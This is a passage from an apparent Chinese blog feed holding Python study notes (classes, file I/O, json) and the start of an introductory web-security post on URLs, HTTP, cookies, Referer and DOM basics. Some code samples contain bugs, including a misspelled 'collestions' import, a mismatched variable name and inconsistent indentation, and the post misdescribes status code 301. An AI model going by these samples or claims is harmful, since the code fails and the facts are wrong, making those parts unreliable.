class="string">&quot;&quot;&quot;返回整洁的描述性名称&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出汽车的里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">        拒绝将里程表往回拨</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">        	self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading += miles</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_car.py</span></span><br><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure></div>

<h4 id="从一个模块中导入多个类"><a href="#从一个模块中导入多个类" class="headerlink" title="从一个模块中导入多个类"></a>从一个模块中导入多个类</h4><blockquote>
<p>from 模块名  import   类名,类名</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#my_cars.py</span></span><br><span class="line"><span class="keyword">from</span> electric_car <span class="keyword">import</span> Car,ElectricCar</span><br><span class="line"></span><br><span class="line">my_beetle = Car(<span class="string">&#x27;volkswagen&#x27;</span>, <span class="string">&#x27;beetle&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_beetle.get_descriptive_name())</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;roadster&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Volkswagen Beetle</span><br><span class="line">2016 Tesla Roadster</span><br></pre></td></tr></table></figure></div>

<h4 id="导入模块以及模块中的所有类"><a href="#导入模块以及模块中的所有类" class="headerlink" title="导入模块以及模块中的所有类"></a>导入模块以及模块中的所有类</h4><blockquote>
<p><strong>导入整个模块：</strong></p>
<p>import 模块名</p>
<p><strong>导入模块中的所有类：</strong></p>
<p>from module_name import *</p>
</blockquote>
<h3 id="Python标准库"><a href="#Python标准库" class="headerlink" title="Python标准库"></a>Python标准库</h3><blockquote>
<p>推荐几个查看Python标准库的网址：</p>
<p><a class="link" href="https://docs.python.org/zh-cn/3/library/index.html">Python官网的标注库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.runoob.com/python3/python3-stdlib.html">菜鸟教程的标注库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>一、<strong>collestions</strong>库中的OrderedDict方法</p>
<blockquote>
<p>OrderedDict()创建一个有序字典，它记录了键值对添加的顺序</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collestions <span class="keyword">import</span> OrderedDict</span><br><span class="line"><span class="comment">#将字典的键和值的顺序进行记录</span></span><br><span class="line">favorite_languages = OrderedDict()</span><br><span class="line"><span class="comment">#调用OrderedDict()函数创建favorite_languages空字典</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;jen&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;sarah&#x27;</span>] = <span class="string">&#x27;c&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;edward&#x27;</span>] = <span class="string">&#x27;ruby&#x27;</span></span><br><span class="line">favorite_languages[<span class="string">&#x27;phil&#x27;</span>] = <span class="string">&#x27;python&#x27;</span></span><br><span class="line"><span class="keyword">for</span> name, language <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(name.title() + <span class="string">&quot;&#x27;s favorite language is &quot;</span> +language.title() + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite language is Python.</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite language is C.</span><br><span class="line">Edward<span class="string">&#x27;s favorite language is Ruby.</span></span><br><span class="line"><span class="string">Phil&#x27;</span>s favorite language is Python.</span><br></pre></td></tr></table></figure></div>

<p>二、random库中的randint()方法</p>
<blockquote>
<p>randint()返回一个位于指定范围内的整数</p>
</blockquote>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="从文件中读取数据"><a href="#从文件中读取数据" class="headerlink" title="从文件中读取数据"></a>从文件中读取数据</h3><blockquote>
<p>**open( ‘files_name’)**打开文件并且返回一个文件对象，注意，该文件和当前执行的文件所在目录相同，如若不同则应该写入文件路径：</p>
<p><strong>Linux 和OS X系统中的文件路径用’&#x2F;‘斜杆</strong></p>
<p>with open(‘text_files&#x2F;filename.txt’) as file_object:</p>
<p><strong>Windows系统中文件路径用’\‘反斜杠</strong></p>
<p>with open(‘text_files\filename.txt’) as file_object:</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;files_name.txt&#x27;</span>) <span class="keyword">as</span> file_objecta:<span class="comment">#files_name需要带上文件后缀</span></span><br><span class="line">	<span class="string">&quot;&quot;&quot;关键字with，让Python负责妥善地打开和关闭文件。&quot;&quot;&quot;</span></span><br><span class="line">	contents = file_object.read()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;file_object.read()调用读取函数读取文件中的内容&quot;&quot;&quot;</span></span><br><span class="line">	<span class="built_in">print</span>(contents.rstrip())<span class="comment">#rstrip会删除字符串末尾的字符</span></span><br></pre></td></tr></table></figure></div>

<h4 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h4><blockquote>
<p>**for line in file_object:**利用循环进行逐行读取文件内容</p>
</blockquote>
<blockquote>
<p><strong>pi_digits.txt</strong></p>
<p>3.1415926535<br>    8979323846<br>    2643383279</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">	<span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure></div>

<h4 id="创建一个包含文件各行内容的列表"><a href="#创建一个包含文件各行内容的列表" class="headerlink" title="创建一个包含文件各行内容的列表"></a>创建一个包含文件各行内容的列表</h4><blockquote>
<p>lines &#x3D; file_object.readlines()<br>#调用readlines()函数将文件的各行存储在创建的列表中</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">	lines = file_object.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.1415926535</span><br><span class="line">  8979323846</span><br><span class="line">  2643383279</span><br></pre></td></tr></table></figure></div>

<h4 id="使用文件里的内容"><a href="#使用文件里的内容" class="headerlink" title="使用文件里的内容"></a>使用文件里的内容</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pi_string.py</span></span><br><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line">pi_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	pi_string += line.strip()</span><br><span class="line"><span class="built_in">print</span>(pi_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pi_string))</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">3.141592653589793238462643383279</span><br><span class="line">32</span><br></pre></td></tr></table></figure></div>

<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><blockquote>
<p> <u><strong>with open(filename,’a’) as file_object:</strong></u>#以附加模式打开文件</p>
<p><strong><u><em>模式：</em></u></strong></p>
<p>​	<strong>#读取模式‘r’</strong></p>
<p>​	<strong>#写入模式’w,’打开前清空文件内容</strong></p>
<p>​	<strong>#附加模式’a’</strong></p>
<p>​	<strong>#读取和写入模式’r+’</strong></p>
<p><strong><u>file_object.write(“需要写入的内容”)</u></strong></p>
<p>注意：</p>
<p><strong>Python只能将字符串写入文本文件。要将数值数据存储到文本文件中，必须先使用函数str()将其转换为字符串格式。</strong></p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#write_messages.py</span></span><br><span class="line">filename = <span class="string">&#x27;programming.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;I love programming.\n&quot;</span>)</span><br><span class="line">	file_object.write(<span class="string">&quot;敬请T期待@&quot;</span>)</span><br><span class="line">    file_object.write(<span class="string">&quot;KingWempity&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>programming.txt</p>
<blockquote>
<p>I love programming.<br>敬请T期待@KingWempity</p>
</blockquote>
<h3 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h3><blockquote>
<p>使用json模块来存储数据</p>
<p><strong>通常使用文件扩展名.json来指出文件存储的数据为JSON格式。</strong></p>
</blockquote>
<h4 id="json-dump"><a href="#json-dump" class="headerlink" title="json.dump()"></a>json.dump()</h4><blockquote>
<p>函数json.dump()接受两个实参：要存储的数据以及可用于存储数据的文件对象。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_writer.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">numbers = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    json.dump(numbers, f_obj)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">先导入模块json，再创建一个数字列表。我们指定了要将该数字列表存储到其中的文件的名称。通常使用文件扩展名.json来指出文件存储的数据为JSON格式。接下来，我们以写入模式打开这个文件，让json能够将数据写入其中。我们使用函数json.dump()将数字列表存储到文件numbers.json中。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>打开文件numbers.json</p>
<blockquote>
<p>[2, 3, 5, 7, 11, 13]</p>
</blockquote>
<h4 id="json-load"><a href="#json-load" class="headerlink" title="json.load()"></a>json.load()</h4><blockquote>
<p>函数json.load()加载存储在filename.json中的信息</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_reader.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;numbers.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	numbers = json.load(f_obj)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[2, 3, 5, 7, 11, 13]</span><br></pre></td></tr></table></figure></div>

<hr>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">	json.dump(username, f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greet_user.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">	username = json.load(f_obj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure></div>

<hr>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#remember_me.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 如果以前存储了用户名，就加载它</span></span><br><span class="line"><span class="comment"># 否则，就提示用户输入用户名并存储它</span></span><br><span class="line">filename = <span class="string">&#x27;username.json&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> f_obj:</span><br><span class="line">        username = json.load(f_obj)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;What is your name? &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f_obj:</span><br><span class="line">    	json.dump(username, f_obj)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We&#x27;ll remember you when you come back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome back, &quot;</span> + username + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>首次运行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">What is your name? Eric</span><br><span class="line">We<span class="string">&#x27;ll remember you when you come back, Eric!</span></span><br></pre></td></tr></table></figure></div>

<p>否则</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome back, Eric!</span><br></pre></td></tr></table></figure></div>







<p><strong>至此，本书第一部分基础知识已基本完结撒花❀❀❀</strong></p>
<p>🎇🎇🎇</p>
<p>推荐几个个版本python知识学习的网址</p>
<blockquote>
<p><a class="link" href="https://www.runoob.com/python3/python3-tutorial.html">菜鸟教程Python3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.cainiaojc.com/python/python-tutorial.html">菜鸟教程Python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>虽然都是菜鸟教程，但因为版本问题，版本界面有些许变化，笔者更适应第一个，因人而异，最适合自己的才是最好的！</p>
<p><a class="link" href="https://docs.python.org/zh-cn/3/index.html">Python.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Python官网的文档，里面有一切想要了解的东西！教程、标准库、语言参考、安装用法……</p>
<p>笔者不才，如有错误还望读者指正，后续会更新评论版块，欢迎大家留言指正！！！</p>
<p>敬请T期待！</p>
<p>感谢各位读者朋友的支持和理解！❀❀❀</p>
</blockquote>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>python</tag>
        <tag>Learn</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_白帽子</title>
    <url>/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
    <content><![CDATA[<h2 id="Web基础介绍"><a href="#Web基础介绍" class="headerlink" title="Web基础介绍"></a>Web基础介绍</h2><blockquote>
<p>知识点罗列：</p>
<ul>
<li>URL概念、结构格式</li>
<li>HTTP报文结构</li>
<li>cookie含义</li>
<li>Set-cookie含义</li>
<li>Referer的作用</li>
<li>状态码301和302的含义</li>
<li>Location的含义</li>
</ul>
</blockquote>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><blockquote>
<p>统一资源定位符（Uniform Resource Locator）</p>
</blockquote>
<blockquote>
<p>作用：定位服务器资源</p>
</blockquote>
<blockquote>
<p>URL格式：schemna:&#x2F;&#x2F;host[:post#]&#x2F;path&#x2F;…&#x2F;[?query-string][#anchor]</p>
<p>schemna	底层协议(例如：http,https,ftp…)</p>
<p>host		  服务器的域名或IP地址</p>
<p>:post 		服务器的端口，HTTP默认端口是80(可省略)，其他端口需要指明</p>
<p>&#x2F;path&#x2F;…&#x2F;	访问资源的路径</p>
<p>？query-string 发送给http服务器的数据</p>
<p>[#anchor]	 锚</p>
</blockquote>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote>
<p>超文本传输协议（Hyper Text Transfer Protocol）</p>
</blockquote>
<blockquote>
<p>作用：Web通信时使用的协议</p>
</blockquote>
<blockquote>
<ol>
<li><p>HTTP报文</p>
<p>HTTP报文是用于HTTP协议交互的信息，HTTP报文本身是由多行数据构成的字符串文本。客户端的HTTP报文叫做请求报文，服务器端的HTTP报文叫做响应报文。</p>
</li>
<li><p>HTTP报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="http报文结构"></p>
<p><strong>报文首部</strong>是客户端或服务器端需处理的<code>请求或响应</code>的内容及属性， 可以传递额外的重要信息。报文首部包括请求行和请求头部。</p>
<p>空行</p>
<p><strong>报文主体</strong>主要包含应被发送的数据。通常，不一定有报文主体。</p>
</li>
<li><p>HTTP请求报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP请求报文结构"></p>
<p>GET和POST的区别：</p>
<blockquote>
<p>（1）get是从服务器上获取数据（即下载），post是向服务器传送数据（即上传）。<br>（2）生成方式不同：<br>Get：URL输入；超连接；Form表单中method属性为get；Form表单中method为空。<br>Post只有一种：Form表单中method为Post。<br>（3）数据传送方式：Get传递的请求数据按照key-value的方式放在URL后面，在网址中可以直接看到，使用?分割URL和传输数据，传输的参数之间以&amp;相连，如：login.action?name&#x3D;user&amp;password&#x3D;123。所以安全性差。<br>POST方法会把请求的参数放到请求头部和空格下面的请求数据字段就是请求正文（请求体）中以&amp;分隔各个字段，请求行不包含参数，URL中不会额外附带参数。所以安全性高。<br>（3）发送数据大小的限制：通常GET请求可以用于获取轻量级的数据，而POST请求的内容数据量比较庞大些。<br>Get：1~2KB。get方法提交数据的大小直接影响到了URL的长度，但HTTP协议规范中其实是没有对URL限制长度的，限制URL长度的是客户端或服务器的支持的不同所影响。<br>Post：没有要求。post方式HTTP协议规范中也没有限定，起限制作用的是服务器的处理程序的能力。<br>（4）提交数据的安全：POST比GET方式的安全性要高。Get安全性差，Post安全性高。<br>通过GET提交数据，用户名和密码将明文出现在URL上，如果登录页面有浏览器缓存，或者其他人查看浏览器的历史记录，那么就可以拿到用户的账号和密码了。安全性将会很差。</p>
</blockquote>
</li>
<li><p>HTTP响应报文结构</p>
<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP响应报文结构"></p>
</li>
</ol>
<hr>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
<p>参考文章</p>
<p>原文链接：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216286">https://blog.csdn.net/qq_35887546/article/details/104216286 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p>HTTP请求的方式</p>
<p>–GET</p>
<p>–POST</p>
<p>–HEAD				 与GET请求类似，不同在于与服务器只返回HTTP头部信息，没有页面内容</p>
<p>–PUT					上传指定URL的描述</p>
<p>–DELETE			 删除指定资源</p>
<p>–OPTIONS 		 返回服务器支持的HTTP方法</p>
</blockquote>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote>
<p>cookie:相当于用户的凭证，类似与用户的通行证，很重要。</p>
<p>set-cookie:服务器要求浏览器设置cookie</p>
</blockquote>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote>
<p>Referer的作用：</p>
<p>–告知服务器该请求的来源（浏览器自动加上）</p>
<p>–统计流量</p>
<p>–判断来源合法性：防止盗链，防止CSRF漏洞</p>
</blockquote>
<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote>
<p>Location：跳转到地址</p>
</blockquote>
<h3 id="响应报文状态码"><a href="#响应报文状态码" class="headerlink" title="响应报文状态码"></a>响应报文状态码</h3><blockquote>
<p>响应报文状态码</p>
<p><strong>3</strong>：完成此请求必须进一步处理**</p>
<p>301——删除请求数据</p>
<p>302——在其他地址发现了请求数据</p>
<hr>
<p>详细状态码：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216807">https://blog.csdn.net/qq_35887546/article/details/104216807 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="前端开发基础知识"><a href="#前端开发基础知识" class="headerlink" title="前端开发基础知识"></a>前端开发基础知识</h2><blockquote>
<p>知识点罗列：</p>
<p>​	–JavaScript</p>
<p>​	–DOM</p>
<p>​	–BOM</p>
</blockquote>
<h3 id="javaScript"><a href="#javaScript" class="headerlink" title="javaScript"></a>javaScript</h3><blockquote>
<p>javaScript运行位置：</p>
<ul>
<li>HTML的<script></script></li>
<li>HTML的事件属性中</li>
<li>浏览器中的JavaScript控制台中的Console中</li>
</ul>
</blockquote>
<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><blockquote>
<p>DOM本质：链接Web页面和编程语言</p>
<p>JavaScript + DOM：访问和操作HTML文档的标准方法</p>
</blockquote>
<blockquote>
<p>获取一个HTML元素内容</p>
<ul>
<li><p>tep1：获取元素</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()<span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep2：获取元素的内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span><span class="comment">//获取元素的内容</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep3：显示获取信息</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>alert()方法在JavaScript中表示弹出一个警告框，可以用来展示信息</strong></p>
</li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;id为intro元素的文本是：&#x27;</span>+x.<span class="property">innerHTML</span>);  </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>修改一个HTML元素</p>
<ul>
<li><p>tep1：获取元素</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>tep2：获取元素内容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</blockquote>
<p>示例</p>
<blockquote>
